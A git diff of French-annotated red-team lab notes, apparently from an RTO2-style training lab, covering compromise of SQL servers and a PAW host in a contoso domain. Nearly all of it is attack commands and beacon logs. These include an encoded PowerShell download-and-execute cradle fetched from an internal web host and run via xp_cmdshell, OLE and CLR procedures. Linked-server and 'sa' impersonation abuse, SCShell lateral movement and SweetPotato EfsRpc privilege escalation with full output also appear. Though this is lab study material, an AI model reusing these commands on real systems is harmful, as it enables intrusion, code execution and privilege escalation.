@@ -65,16 +65,131 @@ retreived 2 results total
 
 # LON-SQL-1
 
+NE FONCTIONNE PAS (pourquoi?)
 ```
-sql-enableole lon-sql-1
+sql-enablexp lon-sql-1
 
 run netsh advfirewall firewall add rule name="Debug" dir=in action=allow protocol=TCP localport=8080
+
+rportfwd 8080 localhost 80
 
 $cmd = 'IEX ((new-object net.webclient).downloadstring("http://lon-web-1:8080/a"))'
 
 SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==
 
-sql-olecmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA=="
+sql-xpcmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA=="
+```
+
+PATH
+```
+[09/10 09:27:21] beacon> jump scshell64 lon-sql-1 smb
+[09/10 09:27:21] [*] Tasked beacon to jump to lon-sql-1 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell
+[09/10 09:27:21] [*] Tasked beacon to upload \\lon-sql-1\C$\Windows\System32\malware57.exe as \\lon-sql-1\C$\Windows\System32\malware57.exe
+[09/10 09:27:21] [*] Running BOF SCShell (scshellbof.x64.o)
+[09/10 09:27:21] [*] Tasked beacon to remove \\lon-sql-1\C$\Windows\System32\malware57.exe
+[09/10 09:27:22] [+] host called home, sent: 404409 bytes
+[09/10 09:27:44] [-] could not upload file: 5 - ERROR_ACCESS_DENIED
+[09/10 09:27:44] [+] received output:
+Trying to connect to lon-sql-1
+
+[09/10 09:27:44] [+] received output:
+Advapi32$OpenSCManagerA failed 5
+
+[09/10 09:27:44] [+] established link to child beacon: 10.10.120.20
 ```
 
 # LON-SQL-2
+
+NE FONCTIONNE PAS (pourquoi?)
+```
+[09/10 08:49:58] beacon> sql-impersonate lon-sql-2
+[09/10 08:49:58] [*] Tasked beacon to gather SQL logins that can be impersonated on lon-sql-2
+[09/10 08:49:58] [+] host called home, sent: 11361 bytes
+[09/10 08:49:58] [+] received output:
+[*] Connecting to lon-sql-2:1433
+[+] Successfully connected to database
+[*] Enumerating users that can be impersonated on lon-sql-2
+
+name | 
+-------
+sa | 
+
+[*] Disconnecting from server
+
+
+LINK
+sql-xpcmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" lon-sql-2.contoso.com
+
+sql-olecmd lon-sql-1 "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" lon-sql-2.contoso.com
+
+sql-clr lon-sql-1 C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" lon-sql-2.contoso.com
+
+
+IMPERSONATE
+sql-xpcmd lon-sql-2.contoso.com "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" "" sa
+
+sql-olecmd lon-sql-2.contoso.com "cmd /c powershell -w hidden -nop -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBsAG8AbgAtAHcAZQBiAC0AMQA6ADgAMAA4ADAALwBhACIAKQApAA==" "" "" sa
+
+sql-clr lon-sql-2.contoso.com C:\Users\Attacker\source\repos\ClassLibrary1\bin\Release\ClassLibrary1.dll MyProcedure "" "" sa
+```
+
+PATH
+```
+[09/10 09:27:07] [+] established link to parent beacon: 10.10.120.10
+[09/10 09:28:23] beacon> jump scshell64 lon-sql-2 smb
+[09/10 09:28:23] [*] Tasked beacon to jump to lon-sql-2 (windows/beacon_bind_pipe (\\.\pipe\TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337)) via SCShell
+[09/10 09:28:23] [*] Tasked beacon to upload \\lon-sql-2\C$\Windows\System32\malware57.exe as \\lon-sql-2\C$\Windows\System32\malware57.exe
+[09/10 09:28:23] [*] Running BOF SCShell (scshellbof.x64.o)
+[09/10 09:28:23] [*] Tasked beacon to remove \\lon-sql-2\C$\Windows\System32\malware57.exe
+[09/10 09:28:25] [+] host called home, sent: 404369 bytes
+[09/10 09:28:47] [-] could not upload file: 5 - ERROR_ACCESS_DENIED
+[09/10 09:28:47] [+] received output:
+Trying to connect to lon-sql-2
+
+[09/10 09:28:47] [+] received output:
+Advapi32$OpenSCManagerA failed 5
+
+[09/10 09:28:47] [+] established link to child beacon: 10.10.120.25
+```
+
+PRIVESC
+
+Créer un listener tcp-local
+Générer un stageless payload .exe sur ce listener
+```
+beacon> cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
+beacon> upload C:\Payloads\tcp-local_x64.exe
+[09/10 09:36:41] beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -e EfsRpc -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
+[09/10 09:36:45] [*] Tasked beacon to run .NET program: SweetPotato.exe -e EfsRpc -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
+[09/10 09:36:50] [+] host called home, sent: 1058195 bytes
+[09/10 09:36:51] [+] job registered with id 2
+[09/10 09:36:51] [+] [job 2] received output:
+SweetPotato by @_EthicalChaos_
+  Orignal RottenPotato code and exploit by @foxglovesec
+  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery
+  PrintSpoofer discovery and original exploit by @itm4n
+  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam
+[+] Attempting NP impersonation using method EfsRpc to launch C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe
+
+[09/10 09:36:56] [+] [job 2] received output:
+[+] Triggering name pipe access on evil PIPE \\localhost/pipe/fdb8126b-623c-4b91-96a3-f7f8f041e3e7/\fdb8126b-623c-4b91-96a3-f7f8f041e3e7\fdb8126b-623c-4b91-96a3-f7f8f041e3e7
+[+] Server connected to our evil RPC pipe
+[+] Duplicated impersonation token ready for process creation
+[+] Intercepted and authenticated successfully, launching program
+[+] Process created, enjoy!
+
+[09/10 09:36:56] [+] job 2 completed
+[09/10 09:37:14] beacon> connect localhost 4444
+[09/10 09:37:14] [*] Tasked to connect to localhost:4444
+[09/10 09:37:16] [+] host called home, sent: 28 bytes
+[09/10 09:37:16] [+] established link to child beacon: 10.10.120.25
+```
+
+# LON-PAW-1
+
+```
+steel token
+cd \\lon-paw-1\c$
+pwd
+upload C:\Users\Attacker\Desktop\rto2.txt
+```
